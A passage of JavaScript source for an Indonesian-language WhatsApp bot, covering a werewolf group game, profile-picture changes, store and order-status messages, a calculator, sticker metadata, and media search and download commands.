            )}. Dengan sihir yang kamu punya, kamu bisa mengetahui peran pemain pilihanmu.\n*LIST PLAYER*:\n${list1}\n\nKetik *.wwpc dreamy nomor* untuk melihat role player`;
                    
                     let row = [];
                     for (let p = 0; p < ww[chat].player.length; p++) {
                       row.push({
                         title: `Cek Player ${ww[chat].player[p].number}`,
                         rowId: `.ww dreamy ${ww[chat].player[p].number}`,
                         description: `Untuk melihat identitas player ${ww[chat].player[p].number}`,
                       });
                     }
                     const sections = [
                       { title: "⌂ W E R E W O L F - G A M E", rows: row },
                     ];
                     const listMessage = {
                       text: text,
                       footer: `Player Hidup: ${playerHidup(
                         sesi(m.chat, ww)
                       )} Player Mati: ${playerMati(sesi(m.chat, ww))}`,
                       title: "⌂ W E R E W O L F - G A M E\n",
                       buttonText: "Clik here!",
                       sections,
                       mentions: player,
                     };
                     await TradzSigma.sendMessage(ww[chat].player[i].id, listMessage);
                     
                    await TradzSigma.sendMessage(ww[chat].player[i].id, {
                        text: texxt,
                        mentions: player,
                    });
                }
            } else if (ww[chat].player[i].role === "guardian") {
                if (ww[chat].player[i].isdead != true) {
                    let teext = `Hai ${TradzSigma.getName(
              ww[chat].player[i].id
            )} Kamu terpilih untuk memerankan *Malaikat Pelindung* ${emoji_role(
              "guardian"
            )}, dengan kekuatan yang kamu miliki, kamu bisa melindungi para warga, silahkan pilih salah 1 player yang ingin kamu lindungi\n*LIST PLAYER*:\n${list1}\n\nKetik *.wwpc deff nomor* untuk melindungi player`;
                    
                    let row = [];
                    for (let p = 0; p < ww[chat].player.length; p++) {
                      row.push({
                        title: `Lindungi Player ${ww[chat].player[p].number}`,
                        rowId: `.ww deff ${ww[chat].player[p].number}`,
                        description: `Untuk melindungi player ${ww[chat].player[p].number}`,
                      });
                    }
                    const sections = [
                      { title: "⌂ W E R E W O L F - G A M E", rows: row },
                    ];
                    const listMessage = {
                      text: text,
                      footer: `Player Hidup: ${playerHidup(
                        sesi(m.chat, ww)
                      )} Player Mati: ${playerMati(sesi(m.chat, ww))}`,
                      title: "⌂ W E R E W O L F - G A M E\n",
                      buttonText: "Clik here!",
                      sections,
                      mentions: player,
                    };
                    await TradzSigma.sendMessage(ww[chat].player[i].id, listMessage);
                    
                    await TradzSigma.sendMessage(ww[chat].player[i].id, {
                        text: teext,
                        mentions: player,
                    });
                }

                // [ Sorcerer ]
            } else if (ww[chat].player[i].role === "sorcerer") {
                if (ww[chat].player[i].isdead != true) {
                    let textu = `Hai ${TradzSigma.getName(
              ww[chat].player[i].id
            )} Kamu terpilih sebagai Penyihir ${emoji_role(
              "sorcerer"
            )}, dengan kekuasaan yang kamu punya, kamu bisa membuka identitas para player, silakan pilih 1 orang yang ingin kamu buka identitasnya\n*LIST PLAYER*:\n${list2}\n\nKetik *.wwpc sorcerer nomor* untuk melihat role player`;
                    
                    let row = [];
                    for (let p = 0; p < ww[chat].player.length; p++) {
                      row.push({
                        title: `Cek Player ${ww[chat].player[p].number}`,
                        rowId: `.ww sorcerer ${ww[chat].player[p].number}`,
                        description: `Untuk melihat identitas player ${ww[chat].player[p].number}`,
                      });
                    }
                    const sections = [
                      { title: "⌂ W E R E W O L F - G A M E", rows: row },
                    ];
                    const listMessage = {
                      text: text,
                      footer: `Player Hidup: ${playerHidup(
                        sesi(m.chat, ww)
                      )} Player Mati: ${playerMati(sesi(m.chat, ww))}`,
                      title: "⌂ W E R E W O L F - G A M E\n",
                      buttonText: "Clik here!",
                      sections,
                      mentions: player,
                    };
                    await TradzSigma.sendMessage(ww[chat].player[i].id, listMessage);
                    
                    await TradzSigma.sendMessage(ww[chat].player[i].id, {
                        text: textu,
                        mentions: player,
                    });
                }
            }
        }
        await TradzSigma.sendMessage(m.chat, {
            text: "*⌂ W E R E W O L F - G A M E*\n\nGame telah dimulai, para player akan memerankan perannya masing masing, silahkan cek chat pribadi untuk melihat role kalian. Berhati-hatilah para warga, mungkin malam ini adalah malah terakhir untukmu",
            contextInfo: {
                externalAdReply: {
                    title: "W E R E W O L F",
                    mediaType: 1,
                    renderLargerThumbnail: true,
                    thumbnail: await resize(thumb, 300, 175),
                    sourceUrl: "",
                    mediaUrl: thumb,
                },
                mentionedJid: player,
            },
        });
        await run(TradzSigma, chat, ww);
    } else if (value === "vote") {
        if (!ww[chat]) return replyviex("Belum ada sesi permainan");
        if (ww[chat].status === false)
            return replyviex("Sesi permainan belum dimulai");
        if (ww[chat].time !== "voting")
            return replyviex("Sesi voting belum dimulai");
        if (playerOnRoom(sender, chat, ww) === false)
            return replyviex("Kamu bukan player");
        if (dataPlayer(sender, ww).isdead === true)
            return replyviex("Kamu sudah mati");
        if (!target || target.length < 1)
            return replyviex("Masukan nomor player");
        if (isNaN(target)) return replyviex("Gunakan hanya nomor");
        if (dataPlayer(sender, ww).isvote === true)
            return replyviex("Kamu sudah melakukan voting");
        b = getPlayerById(chat, sender, parseInt(target), ww);
        if (b.db.isdead === true)
            return m.reply(`Player ${target} sudah mati.`);
        if (ww[chat].player.length < parseInt(target))
            return m.reply("Invalid");
        if (getPlayerById(chat, sender, parseInt(target), ww) === false)
            return replyviex("Player tidak terdaftar!");
        vote(chat, parseInt(target), sender, ww);
        return m.reply("✅ Vote");
    } else if (value == "exit") {
        if (!ww[chat]) return replyviex("Tidak ada sesi permainan");
        if (playerOnRoom(sender, chat, ww) === false)
            return replyviex("Kamu tidak dalam sesi permainan");
        if (ww[chat].status === true)
            return replyviex("Permainan sudah dimulai, kamu tidak bisa keluar");
        replyviex(`@${sender.split("@")[0]} Keluar dari permainan`, {
            withTag: true,
        });
        playerExit(chat, sender, ww);
    } else if (value === "delete") {
        if (!ww[chat]) return replyviex("Tidak ada sesi permainan");
        if (ww[chat].owner !== sender)
            return replyviex(
                `Hanya @${
            ww[chat].owner.split("@")[0]
          } yang dapat menghapus sesi permainan ini`
            );
        replyviex("Sesi permainan berhasil dihapus").then(() => {
            delete ww[chat];
        });
    } else if (value === "player") {
        if (!ww[chat]) return replyviex("Tidak ada sesi permainan");
        if (playerOnRoom(sender, chat, ww) === false)
            return replyviex("Kamu tidak dalam sesi permainan");
        if (ww[chat].player.length === 0)
            return replyviex("Sesi permainan belum memiliki player");
        let player = [];
        let text = "\n*⌂ W E R E W O L F - G A M E*\n\nLIST PLAYER:\n";
        for (let i = 0; i < ww[chat].player.length; i++) {
            text += `(${ww[chat].player[i].number}) @${ww[chat].player[i].id.replace(
          "@s.whatsapp.net",
          ""
        )} ${
          ww[chat].player[i].isdead === true
            ? `☠️ ${ww[chat].player[i].role}`
            : ""
        }\n`;
            player.push(ww[chat].player[i].id);
        }
        TradzSigma.sendMessage(
            m.chat, {
                text: text,
                contextInfo: {
                    externalAdReply: {
                        title: "W E R E W O L F",
                        mediaType: 1,
                        renderLargerThumbnail: true,
                        thumbnail: await resize(thumb, 300, 175),
                        sourceUrl: "",
                        mediaUrl: thumb,
                    },
                    mentionedJid: player,
                },
            }, {
                quoted: m
            }
        );
    } else {
        let text = `\n*⌂ W E R E W O L F - G A M E*\n\nPermainan Sosial Yang Berlangsung Dalam Beberapa Putaran/ronde. Para Pemain Dituntut Untuk Mencari Seorang Penjahat Yang Ada Dipermainan. Para Pemain Diberi Waktu, Peran, Serta Kemampuannya Masing-masing Untuk Bermain Permainan Ini\n\n*⌂ C O M M A N D*\n`;
        text += ` • ww create\n`;
        text += ` • ww join\n`;
        text += ` • ww start\n`;
        text += ` • ww exit\n`;
        text += ` • ww delete\n`;
        text += ` • ww player\n`;
        text += `\nPermainan ini dapat dimainkan oleh 5 sampai 15 orang.`;
        TradzSigma.sendMessage(
            m.chat, {
                text: text.trim(),
                contextInfo: {
                    externalAdReply: {
                        title: "W E R E W O L F",
                        mediaType: 1,
                        renderLargerThumbnail: true,
                        thumbnail: await resize(thumb, 300, 175),
                        sourceUrl: "",
                        mediaUrl: thumb,
                    },
                },
            }, {
                quoted: m
            }
        );
    }
}
break
//==================================================================
case 'wwpc': {
let {
    emoji_role,
    sesi,
    playerOnGame,
    playerOnRoom,
    playerExit,
    dataPlayer,
    dataPlayerById,
    getPlayerById,
    getPlayerById2,
    killWerewolf,
    killww,
    dreamySeer,
    sorcerer,
    protectGuardian,
    roleShuffle,
    roleChanger,
    roleAmount,
    roleGenerator,
    addTimer,
    startGame,
    playerHidup,
    playerMati,
    vote,
    voteResult,
    clearAllVote,
    getWinner,
    win,
    pagi,
    malam,
    skill,
    voteStart,
    voteDone,
    voting,
    run,
    run_vote,
    run_malam,
    run_pagi
} = require('./lib/werewolf.js')

    const {
        sender,
        chat
    } = m;
    TradzSigma.werewolf = TradzSigma.werewolf ? TradzSigma.werewolf : {};
    const ww = TradzSigma.werewolf ? TradzSigma.werewolf : {};
    const value = args[0];
    const target = args[1];

    if (playerOnGame(sender, ww) === false)
        return reply("Kamu tidak dalam sesi game");
    if (dataPlayer(sender, ww).status === true)
        return reply(
            "Skill telah digunakan, skill hanya bisa digunakan sekali setiap malam"
        );
    if (dataPlayer(sender, ww).isdead === true)
        return reply("Kamu sudah mati");
    if (!target || target.length < 1) return reply("Masukan nomor player");
    if (isNaN(target)) return reply("Gunakan hanya nomor");
    let byId = getPlayerById2(sender, parseInt(target), ww);
    if (byId.db.isdead === true) return reply("Player sudah mati");
    if (byId.db.id === sender)
        return reply("Tidak bisa menggunakan skill untuk diri sendiri");
    if (byId === false) return reply("Player tidak terdaftar");
    if (value === "kill") {
        if (dataPlayer(sender, ww).role !== "werewolf")
            return reply("Peran ini bukan untuk kamu");
        if (byId.db.role === "sorcerer")
            return reply("Tidak bisa menggunakan skill untuk teman");
        return m
            .reply("Berhasil membunuh player " + parseInt(target))
            .then(() => {
                dataPlayer(sender, ww).status = true;
                killWerewolf(sender, parseInt(target), ww);
            });
    } else if (value === "dreamy") {
        if (dataPlayer(sender, ww).role !== "seer")
            return reply("Peran ini bukan untuk kamu");
        let dreamy = dreamySeer(m.sender, parseInt(target), ww);
        return m
            .reply(`Berhasil membuka identitas player ${target} adalah ${dreamy}`)
            .then(() => {
                dataPlayer(sender, ww).status = true;
            });
    } else if (value === "deff") {
        if (dataPlayer(sender, ww).role !== "guardian")
            return reply("Peran ini bukan untuk kamu");
        return reply(`Berhasil melindungi player ${target}`)
        .then(() => {
            protectGuardian(m.sender, parseInt(target), ww);
            dataPlayer(sender, ww).status = true;
        });
    } else if (value === "sorcerer") {
        if (dataPlayer(sender, ww).role !== "sorcerer")
            return reply("Peran ini bukan untuk kamu");
        let sorker = sorcerer(sesi(m.sender), target);
        return m
            .reply(`Berhasil membuka identitas player ${player} adalah ${sorker}`)
            .then(() => {
                dataPlayer(sender, ww).status = true;
            });
    }
}
break
//==================================================================
case 'setpppanjang': {
const jimp_1 = require('jimp')
async function pepe(media) {
	const jimp = await jimp_1.read(media)
	const min = jimp.getWidth()
	const max = jimp.getHeight()
	const cropped = jimp.crop(0, 0, min, max)
	return {
		img: await cropped.scaleToFit(720, 720).getBufferAsync(jimp_1.MIME_JPEG),
		preview: await cropped.normalize().getBufferAsync(jimp_1.MIME_JPEG)
	}
}

	let q = m.quoted ? m.quoted : m
	let mime = (q.msg || q).mimetype || q.mediaType || ''
	if (/image/g.test(mime) && !/webp/g.test(mime)) {
		try {
			const media = await TradzSigma.downloadAndSaveMediaMessage(quoted)
			let botNumber = await TradzSigma.decodeJid(TradzSigma.user.id)
			let { img } = await pepe(media)
			await TradzSigma.query({
				tag: 'iq',
				attrs: {
					to: botNumber,
					type:'set',
					xmlns: 'w:profile:picture'
				},
				content: [
					{
						tag: 'picture',
						attrs: { type: 'image' },
						content: img
					}
				]
			})
			reply(`Sukses mengganti PP Bot`)
		} catch (e) {
			console.log(e)
			reply(`Terjadi kesalahan, coba lagi nanti.`)
		}
	} else {
		reply(`Kirim gambar dengan caption *${command}* atau tag gambar yang sudah dikirim`)
	}
}
break
//==================================================================
case 'setpppgcanjang': {
const jimp_1 = require('jimp')
async function pepe(media) {
	const jimp = await jimp_1.read(media)
	const min = jimp.getWidth()
	const max = jimp.getHeight()
	const cropped = jimp.crop(0, 0, min, max)
	return {
		img: await cropped.scaleToFit(720, 720).getBufferAsync(jimp_1.MIME_JPEG),
		preview: await cropped.normalize().getBufferAsync(jimp_1.MIME_JPEG)
	}
}

	let q = m.quoted ? m.quoted : m
	let mime = (q.msg || q).mimetype || q.mediaType || ''
	if (/image/g.test(mime) && !/webp/g.test(mime)) {
		try {
			const media = await TradzSigma.downloadAndSaveMediaMessage(quoted)
			let { img } = await pepe(media)
			await TradzSigma.query({
				tag: 'iq',
				attrs: {
					to: m.chat,
					type:'set',
					xmlns: 'w:profile:picture'
				},
				content: [
					{
						tag: 'picture',
						attrs: { type: 'image' },
						content: img
					}
				]
			})
			reply(`Admin @${(m.sender || '').replace(/@s\.whatsapp\.net/g, '')} telah mengganti Icon Group!`, null, { mentions: [m.sender] })
		} catch (e) {
			console.log(e)
			reply(`Terjadi kesalahan, coba lagi nanti.`)
		}
	} else {
		reply(`Kirim gambar dengan caption *${command}* atau tag gambar yang sudah dikirim`)
	}
}
break
case "reactch": {
if (!TradID) return replyviex('Khusus Owner')
if (!text) return replyviex(".reactch linkpesan 😂")
if (!args[0] || !args[1]) return m.reply("Wrong Format")
if (!args[0].includes("https://whatsapp.com/channel/")) return replyviex("Link tautan tidak valid")
let result = args[0].split('/')[4]
let serverId = args[0].split('/')[5]
let res = await TradzSigma.newsletterMetadata("invite", result)
await TradzSigma.newsletterReactMessage(res.id, serverId, args[1])
replyviex(`Berhasil mengirim reaction ${args[1]} ke dalam channel ${res.name}`)
}
break;
//=========================================\\
case 'tenor': {
function isValidURL(message) {
    const urlPattern = /https?:\/\/[^\s/$.?#].[^\s]*/;
    return urlPattern.test(message);
}

async function getTemplateImageUrl(input, number) {
    try {
        const data = await (await fetch(`https://g.tenor.com/v1/search?q=${input}&key=LIVDSRZULELA`)).json();
        const selectedId = data.results[number - 1];
        return {
            one: selectedId,
            all: data.results
        };
    } catch (error) {
        console.error("Error fetching data:", error);
        return "Error fetching data.";
    }
}
    let [tema, urutan] = text.split(/[^\w\s]/g)
    if (!tema) return replyviex("*Contoh:*\n.tenor [tema]|[angka]")
    if (!urutan) return replyviex("*Contoh:*\n.tenor [tema]|[angka]")
    if (isNaN(urutan)) return replyviex("*Contoh:*\n.tenor [tema]|[angka]")
    await m.reply(mess.wait)
    try {
        let json = await getTemplateImageUrl(tema, urutan)
        let data = json.one
        let all = json.all
        if (urutan > all.length) return replyviex("Input query!\n*Contoh:*\n.tenor [tema]|[angka]\n\n*Pilih angka yg ada*\n" + all.map((item, index) => `*${index + 1}.* ${item.content_description}`).join("\n"))
        if (isValidURL(data.media[0].mp4.url)) {
            let caption = `🔍 *[ HASIL ]*

🆔 *ID:* ${data.id}
🌐 *URL:* ${data.url}
📋 *Description:* ${data.content_description}
📌 *Item:* ${data.itemurl}`
            await TradzSigma.sendMessage(m.chat, {
                video: {
                    url: data.media[0].mp4.url
                },
                caption: caption,
                gifPlayback: true,
                gifAttribution: 2
            }, {
                quoted: m
            })
        }
    } catch (e) {
        await m.reply(eror)
    }
}
break

//===============Store-Menu================\\
case 'list': case 'store':{
if (db_respon_list.length === 0) return replyviex(`Belum ada list message di database`)
if (!isAlreadyResponListGroup(m.chat, db_respon_list)) return replyviex(`Belum ada list message yang terdaftar di group ini`)
let teks = `Halo @${m.sender.split("@")[0]} berikut beberapa list yang tersedia saat ini.\n\n`
for (let i of db_respon_list) {
if (i.id === m.chat) {
teks += `- ${i.key.toUpperCase()}\n`
}
}
teks += `\n\nUntuk melihat detail produk, silahkan kirim nama produk yang ada pada list di atas. Misalnya kamu ingin melihat detail produk dari ${db_respon_list[0].key.toUpperCase()}, maka kirim pesan ${db_respon_list[0].key.toUpperCase()} kepada bot`
TradzSigma.sendMessage(m.chat, {text: teks, mentions: [m.sender]}, {quoted:m}) 
}
break
case 'dellist':
if (!m.isGroup) return replyviex('Fitur Khusus Group!')
if (!isAdmins) return reply('Fitur Khusus admin!')
if (db_respon_list.length === 0) return reply(`Belum ada list message di database`)
if (!text) return reply(`Gunakan dengan cara ${prefix + command} *key*\n\n_Contoh_\n\n${prefix + command} hello`)
if (!isAlreadyResponList(m.chat, q.toLowerCase(), db_respon_list)) return reply(`List respon dengan key *${q}* tidak ada di database!`)
delResponList(m.chat, q.toLowerCase(), db_respon_list)
reply(`Sukses delete list message dengan key *${q}*`)
break
case 'addlist':
if (!m.isGroup) return reply('Fitur Khusus Group!')
if (!isAdmins) return reply('Fitur Khusus admin!')
var args1 = q.split("|")[0].toLowerCase()
var args2 = q.split("|")[1]
if (!q.includes("|")) return reply(`Gunakan dengan cara ${prefix+command} *key|response*\n\n_Contoh_\n\n${prefix+command} tes|apa`)
if (isAlreadyResponList(m.chat, args1, db_respon_list)) return reply(`List respon dengan key : *${args1}* sudah ada di group ini.`)
if (/image/.test(mime)) {
let media = await TradzSigma.downloadAndSaveMediaMessage(quoted)
                let mem = await uploadwidipe(media)
addResponList(m.chat, args1, args2, true, mem, db_respon_list)
reply(`Sukses set list message dengan key : *${args1}*`)
if (fs.existsSync(media)) fs.unlinkSync(media)
} else {
addResponList(m.chat, args1, args2, false, '-', db_respon_list)
reply(`Sukses set list message dengan key : *${args1}*`)
}
break
case 'updatelist': case 'update':
if (!m.isGroup) return reply('Fitur Khusus Group!')
if (!isAdmins) return reply('Fitur Khusus admin!')
var args1 = q.split("|")[0].toLowerCase()
var args2 = q.split("|")[1]
if (!q.includes("|")) return reply(`Gunakan dengan cara ${prefix+command} *key|response*\n\n_Contoh_\n\n${prefix+command} tes|apa`)
if (!isAlreadyResponListGroup(m.chat, db_respon_list)) return reply(`Maaf, untuk key *${args1}* belum terdaftar di group ini`)
if (/image/.test(mime)) {
let media = await TradzSigma.downloadAndSaveMediaMessage(quoted)
                let mem = await uploadwidipe(media)
updateResponList(m.chat, args1, args2, true, mem, db_respon_list)
reply(`Sukses update respon list dengan key *${args1}*`)
if (fs.existsSync(media)) fs.unlinkSync(media)
} else {
updateResponList(m.chat, args1, args2, false, '-', db_respon_list)
reply(`Sukses update respon list dengan key *${args1}*`)
}
break
case 'tambah':{
if (!text.includes('+')) return reply(`Gunakan dengan cara ${prefix+command} *angka* + *angka*\n\n_Contoh_\n\n${prefix+command} 1+2`)
arg = args.join(' ')
atas = arg.split('+')[0]
bawah = arg.split('+')[1]
var nilai_one = Number(atas)
var nilai_two = Number(bawah)
reply(`${nilai_one + nilai_two}`)}
break
case '.kurang':{
if (!text.includes('-')) return reply(`Gunakan dengan cara ${prefix+command} *angka* - *angka*\n\n_Contoh_\n\n${prefix+command} 1-2`)
arg = args.join(' ')
atas = arg.split('-')[0]
bawah = arg.split('-')[1]
var nilai_one = Number(atas)
var nilai_two = Number(bawah)
reply(`${nilai_one - nilai_two}`)}
break
case '.kali':{
if (!text.includes('*')) return reply(`Gunakan dengan cara ${prefix+command} *angka* * *angka*\n\n_Contoh_\n\n${prefix+command} 1*2`)
arg = args.join(' ')
atas = arg.split('*')[0]
bawah = arg.split('*')[1]
var nilai_one = Number(atas)
var nilai_two = Number(bawah)
reply(`${nilai_one * nilai_two}`)}
break
case '.bagi':{
if (!text.includes('/')) return reply(`Gunakan dengan cara ${prefix+command} *angka* / *angka*\n\n_Contoh_\n\n${prefix+command} 1/2`)
arg = args.join(' ')
atas = arg.split('/')[0]
bawah = arg.split('/')[1]
var nilai_one = Number(atas)
var nilai_two = Number(bawah)
reply(`${nilai_one / nilai_two}`)}
break
case 'setproses': case 'setp':
if (!m.isGroup) return replyviex('Fitur Khusus Group!')
if (!isAdmins) return replyviex('Fitur Khusus admin!')
if (!text) return replyviex(`Gunakan dengan cara ${prefix + command} *teks*\n\n_Contoh_\n\n${prefix + command} Pesanan sedang di proses ya @user\n\n- @user (tag org yg pesan)\n- @pesanan (pesanan)\n- @jam (waktu pemesanan)\n- @tanggal (tanggal pemesanan) `)
if (isSetProses(m.chat, set_proses)) return reply(`Set proses already active`)
addSetProses(text, m.chat, set_proses)
reply(`✅ Done set proses!`)
break
case 'changeproses': case 'changep':
if (!m.isGroup) return reply('Fitur Khusus Group!')
if (!isAdmins) return reply('Fitur Khusus admin!')
if (!text) return reply(`Gunakan dengan cara ${prefix + command} *teks*\n\n_Contoh_\n\n${prefix + command} Pesanan sedang di proses ya @user\n\n- @user (tag org yg pesan)\n- @pesanan (pesanan)\n- @jam (waktu pemesanan)\n- @tanggal (tanggal pemesanan) `)
if (isSetProses(m.chat, set_proses)) {
changeSetProses(text, m.chat, set_proses)
reply(`Sukses ubah set proses!`)
} else {
addSetProses(text, m.chat, set_proses)
reply(`Sukses ubah set proses!`)
}
break
case 'delsetproses': case 'delsetp':
if (!m.isGroup) return reply('Fitur Khusus Group!')
if (!isAdmins) return reply('Fitur Khusus admin!')
if (!isSetProses(m.chat, set_proses)) return reply(`Belum ada set proses di gc ini`)
removeSetProses(m.chat, set_proses)
reply(`Sukses delete set proses`)
break
case 'setdone':{
if (!m.isGroup) return replyviex('Fitur Khusus Group!')
if (!isAdmins) return replyviex('Fitur Khusus admin!')
if (!text) return reply(`Gunakan dengan cara ${prefix + command} *teks*\n\n_Contoh_\n\n${prefix + command} Done @user\n\n- @user (tag org yg pesan)\n- @pesanan (pesanan)\n- @jam (waktu pemesanan)\n- @tanggal (tanggal pemesanan) `)
if (isSetDone(m.chat, set_done)) return replyviex(`Udh set done sebelumnya`)
addSetDone(text, m.chat, set_done)
reply(`Sukses set done!`)
break
}
case 'changedone': case 'changed':
if (!m.isGroup) return reply('Fitur Khusus Group!')
if (!isAdmins) return reply('Fitur Khusus admin!')
if (!text) return reply(`Gunakan dengan cara ${prefix + command} *teks*\n\n_Contoh_\n\n${prefix + command} Done @user\n\n- @user (tag org yg pesan)\n- @pesanan (pesanan)\n- @jam (waktu pemesanan)\n- @tanggal (tanggal pemesanan) `)
if (isSetDone(m.chat, set_done)) {
changeSetDone(text, m.chat, set_done)
reply(`Sukses ubah set done!`)
} else {
addSetDone(text, m.chat, set_done)
reply(`Sukses ubah set done!`)
}
break
case 'delsetdone': case 'delsetd':
if (!m.isGroup) return reply('Fitur Khusus Group!')
if (!isAdmins) return reply('Fitur Khusus admin!')
if (!isSetDone(m.chat, set_done)) return reply(`Belum ada set done di gc ini`)
removeSetDone(m.chat, set_done)
reply(`Sukses delete set done`)
break
case'proses':{
  if (!m.isGroup) return replyviex('Fitur Khusus Group!')
			if (!m.quoted) return replyviex('Reply pesanan yang akan proses')
            let tek = m.quoted ? quoted.text : quoted.text.split(args[0])[1]
            let proses = `── 「 *DETAIL PESANAN* 」 ──\n\n\`\`\`› Status : 「 Transaksi Pending 」\n› Pesanan : @user\n› Date : @tanggal\n› Clock : @jam\n› Status Pesanan : Diproses ⌛\n› Catatan Pesanan 📝 :\`\`\`\n*@pesanan*\n\n_*Tunggu Sebentar, Orderan Kamu Sedang Diproses Oleh Admin @admin.*_`
            const getTextP = getTextSetProses((m.isGroup? m.chat: botNumber), set_proses);
            if (getTextP !== undefined) {
            	var anunya = (getTextP.replace('@pesanan', tek ? tek : '-').replace('@user', '@' + m.quoted.sender.split("@")[0]).replace('@admin', pushname).replace('@jam', time).replace('@tanggal', tanggal(new Date())).replace('@user', '@' + m.quoted.sender.split("@")[0]))
                TradzSigma.sendTextWithMentions(m.chat, anunya, m)
            } else {
   TradzSigma.sendTextWithMentions(m.chat, (proses.replace('@pesanan', tek ? tek : '-').replace('@user', '@' + m.quoted.sender.split("@")[0]).replace('@admin', pushname).replace('@jam', time).replace('@tanggal', tanggal(new Date())).replace('@user', '@' + m.quoted.sender.split("@")[0])), m)
            }
            }
            break
            case 'd': case'done':{
      if (!m.isGroup) return replyviex('Fitur Khusus Group!')
			if (!m.quoted) return replyviex('Reply pesanan yang telah di proses')
            let tek = m.quoted ? quoted.text : quoted.text.split(args[0])[1]
            let sukses = `── 「 *DETAIL PESANAN* 」 ──\n\n\`\`\`› Status : 「 Transaksi Success 」\n› Pesanan : @user\n› Date : @tanggal\n› Clock : @jam\n› Status Pesanan : Terkirim ✅\n› Catatan Pesanan 📝 :\`\`\`\n*@pesanan*\n\n_*Terimakasih sudah order di @group*_\n*_kami tunggu orderan berikutnya_* 🤗🤗`            
            const getTextD = getTextSetDone((m.isGroup? m.chat: botNumber), set_done);
            if (getTextD !== undefined) {
            	var anunya = (getTextD.replace('@pesanan', tek ? tek : '-').replace('@user', '@' + m.quoted.sender.split("@")[0]).replace('@admin', pushname).replace('@group', groupMetadata.subject).replace('@jam', time).replace('@tanggal', tanggal(new Date())).replace('@user', '@' + m.quoted.sender.split("@")[0]))
            	TradzSigma.sendTextWithMentions(m.chat, anunya, m)
               } else {
               	TradzSigma.sendTextWithMentions(m.chat, (sukses.replace('@pesanan', tek ? tek : '-').replace('@user', '@' + m.quoted.sender.split("@")[0]).replace('@admin', pushname).replace('@group', groupMetadata.subject).replace('@jam', time).replace('@tanggal', tanggal(new Date())).replace('@user', '@' + m.quoted.sender.split("@")[0])), m)
               }
   }
   break
//=========================================\\	
case 'gptimg':
case 'bingimg': {
if (!isPrem) return replyprem(mess.premium)
if (!text) return reply('Promt Nya Bos...')
await TradzSigma.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}}) 
    try {
 TradzSigma.sendMessage(m.chat, { image: { url: `https://imgen.duck.mom/prompt/${encodeURIComponent(text)}`}, caption: `_Sukses Membuat ${command} Dengan Promt:\n${text}_`}, { quoted: m})
    } catch (error) {
reply('eror')
    }
}
break
//=========================================\\	
case 'smeta': {
if (!/webp/.test(mime)) return replyviex('Reply sticker!')
  var stiker = false
    try {
        let [packname, ...author] = q.split('|')
            //var author = (author  []).join('|')
                let mime = m.quoted.mimetype || ''
                        //let img = await q.download()
                            let img = await TradzSigma.downloadAndSaveMediaMessage(quoted, makeid(5))
                                if (!img) return replyviex('Reply a sticker!')
                                    var stiker = await addExifAvatar(img, `Made by`, `DinzID BotID`)
                                      } catch (e) {
                                          console.error(e)
                                              if (Buffer.isBuffer(e)) stiker = e
                                                } finally {
                                                    if (stiker) TradzSigma.sendMessage(m.chat, {
                                                          sticker: stiker
                                                              }, {
                                                                    quoted: m
                                                                        })
                                                                            else return replyviex('reply sticker')
                                                                              }
                                                                              }       
                                                                              break
			case 'gimage': {
if (!text) return replyviex(`Contoh : ${prefix + command} carry minati`)
replyviex(mess.wait)
await TradzSigma.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}}) 
    try {
 TradzSigma.sendMessage(m.chat, { image: { url: `https://imgen.duck.mom/prompt/${encodeURIComponent(text)}`}, caption: `_Sukses Membuat ${command} Dengan Promt:\n${text}_`}, { quoted: m})
    } catch (error) {
reply('eror')
    }
}
        break
			case 'mediafire1': {
	if (args.length == 0) return replyviex(`Dimana linknya?`)
	if (!isUrl(args[0]) && !args[0].includes('mediafire.com')) return replyviex(`The link you provided is invalid`)
	const text = 'https://www.mediafire.com/file/xdw0j1tugxknsdi/Aspira-Bot-V2.8-Free.zip'
	const { mediafireDl } = require('./lib/mediafire.js')
	const baby1 = await mediafireDl(text)
	console.log(baby1)
	if (baby1[0].size.split('MB')[0] >= 10000) return replyviex('Oops, the file is too big...')
	const result4 = `*MEDIAFIRE DOWNLOADER*

*❖ Name* : ${baby1[0].nama}
*❖ Size* : ${baby1[0].size}
*❖ Mime* : ${baby1[0].mime}
*❖ Link* : ${baby1[0].link}`
replyviex(`${result4}`)
TradzSigma.sendMessage(m.chat, { document : { url : baby1[0].link}, fileName : baby1[0].nama, mimetype: baby1[0].mime }, { quoted : m })
}
break
case 'tiktokxx':{ 
if (!text) return replyviex( `Contoh : ${prefix + command} link`)
if (!q.includes('tiktok')) return replyviex(`Link Invalid!!`)
replyviex(mess.wait)
require('./lib/tiktok').Tiktok(q).then( data => {
TradzSigma.sendMessage(m.chat, { caption: `Ini dia!!`, video: { url: data.watermark }}, {quoted:m})
})
}
break
case 'tiktokaudioxx':{
if (!text) return replyviex( `Contoh : ${prefix + command} link`)
if (!q.includes('tiktok')) return replyviex(`Link Invalid!!`)
replyviex(mess.wait)
require('./lib/tiktok').Tiktok(q).then( data => {
TradzSigma.sendMessage(m.chat, { audio: { url: data.audio }, mimetype: 'audio/mp4' }, { quoted: m })
})
}
break
case 'google': {
if (!q) return replyviex(`Contoh : ${prefix + command} ${namabot}`)
replyviex(mess.wait)
let google = require('google-it')
google({'query': text}).then(res => {
let teks = `Google Search From : ${text}\n\n`
for (let g of res) {
teks += `⭔ *Title* : ${g.title}\n`
teks += `⭔ *Description* : ${g.snippet}\n`
teks += `⭔ *Link* : ${g.link}\n\n────────────────────────\n\n`
} 
replyviex(teks)
})
}
break
case 'happymod':{
if (!q) return replyviex(`Contoh ${prefix+command} Sufway surfer mod`)
TradzSigma.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key }})
let kat = await scp1.happymod(q)
replyviex(util.format(kat))
}
break

case 'yts2': case 'ytsearch2': {
if (!text) return replyviex(`Contoh : ${prefix + command} story wa anime`)
const yts = require('yt-search');
async function searchYouTube(text) {
    let search = await yts(text);
    let teks = `🔎 YouTube Search\n\n Hasil Pencarian dari: ${text}\n\n`;
    let no = 1;
    let caption = search.all.map((v, i) => {
        return {
            header: "",
            title: v.title,
            description: `[ ytmp4 ] Link: ${v.url}`,
            id: '.ytmp4 ' + v.url
        };
    });

    let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
            message: {
                messageContextInfo: {
                    deviceListMetadata: {},
                    deviceListMetadataVersion: 2
                },
                interactiveMessage: {
                    body: {
                        text: `🔎 Hasil Pencarian Dari ${text}\nSilahkan Pilih List di bawah ini`
                    },
                    footer: {
                        text: namabot
                    },
                    header: proto.Message.InteractiveMessage.Header.create({
